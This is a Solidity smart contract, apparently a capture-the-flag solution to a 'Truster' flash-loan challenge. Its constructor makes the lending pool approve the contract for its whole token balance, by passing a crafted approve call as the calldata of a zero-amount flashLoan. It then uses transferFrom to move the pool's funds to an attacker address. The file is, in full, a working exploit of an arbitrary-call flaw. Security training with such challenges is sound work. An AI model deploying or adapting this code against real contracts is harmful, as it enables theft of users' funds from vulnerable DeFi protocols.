// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
 * @title AttackerContractTruster
 * @author Juan Farber (github.com/Farber98)
 */
contract AttackerContractTruster {
    constructor(
        IERC20 _tokenAddress,
        address _trusterLenderPool,
        address _attacker,
        uint256 balance
    ) {
        // Prepare data that we are going to execute on flashLoan call. This is the approval.
        bytes memory data = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            balance
        );

        // Call the flashLoan so the so the pool approves this sc inside the token contract.
        _trusterLenderPool.call(
            abi.encodeWithSignature(
                "flashLoan(uint256,address,address,bytes)",
                0, // Borrow 0 so we don't need to repay.
                address(this),
                _tokenAddress,
                data
            )
        );

        // Take the funds and transfer to attacker address.
        _tokenAddress.transferFrom(_trusterLenderPool, _attacker, balance);
    }
}
